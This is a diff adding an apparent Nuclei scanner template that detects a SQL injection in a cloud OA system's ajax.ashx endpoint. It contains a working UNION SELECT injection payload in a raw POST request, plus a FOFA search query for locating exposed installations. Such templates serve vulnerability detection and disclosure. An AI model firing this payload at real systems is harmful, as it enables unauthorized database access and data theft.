@@ -1,0 +1,42 @@
+id: cloud-oa-ajax-sqli
+
+info:
+  name: Cloud OA ajax.ashx - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    cloud OA system /OA/common/mod/ajax.ashx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%85%A8%E7%A8%8B%E4%BA%91OA/%E5%85%A8%E7%A8%8B%E4%BA%91OA__ajax.ashxSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="全程云办公" && body="/OA/WebResource.axd"
+  tags: 全程云OA
+
+http:
+  - raw:
+      - |
+        POST /OA/common/mod/ajax.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+
+        dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "ProductColumn"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a0046304402201ef7eee5943cd3f135682a31365b7e6e55689cfc32f27191495dd04665d674c402206add4553dd66405401f96e1d14db0797a45c9bfc1beb88c8fd8674137a9d81d7:922c64590222798bb761d5b6d8e72950
